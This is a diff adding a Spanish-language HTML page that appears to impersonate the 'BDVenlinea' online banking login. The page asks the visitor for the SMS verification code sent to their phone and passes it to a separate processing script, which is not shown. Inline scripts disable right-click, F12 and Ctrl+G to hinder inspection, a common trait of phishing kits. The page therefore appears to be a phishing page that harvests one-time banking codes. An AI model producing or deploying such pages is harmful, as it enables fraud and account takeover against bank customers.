@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDVenlinea</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+    <script src="js/alerta2.js"></script>
+    <script src="ipvalidation.js"></script>
+      <link rel="icon" href="img/icono.png" type="image/x-icon"> 
+      <link rel="apple-touch-icon" href="img/icono.png"> 
+      <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 71)) {
+                return false;
+            }
+        };
+    </script>
+    <script>
+              document.addEventListener('keydown', function(e) {
+                  if (e.key === 'F12') {
+                      e.preventDefault();
+                  }
+              });
+      
+              document.addEventListener('contextmenu', function(e) {
+                  e.preventDefault();
+              });
+    </script>      
+</head>
+<body class="body">
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
+        <div><img class="logo1" src="img/logo2.png"></div>
+        <div class="cuadrillo" style="text-align: center;"><label class="text1" style="text-align: center;">Ingresa el SMS enviado a tu numero celular registrado. Si no recibiste el SMS Puedes ingresar tu numero generado (ami ven).<br><br></div><br><br><br>
+        <div class="documento">
+            <input class="documento1" type="text" id="documento" inputmode="numeric" minlength="6" maxlength="8" pattern="[0-9]*" required placeholder="Ingresa código de validación">
+        </div>
+        <div class="documento">
+            <button type="submit" class="boton" style="margin-left: 10px;" >Continuar</button>
+        </div><br>
+    </form>
+    <script src="js/processing2.js"></script>
+</body>
+</html>
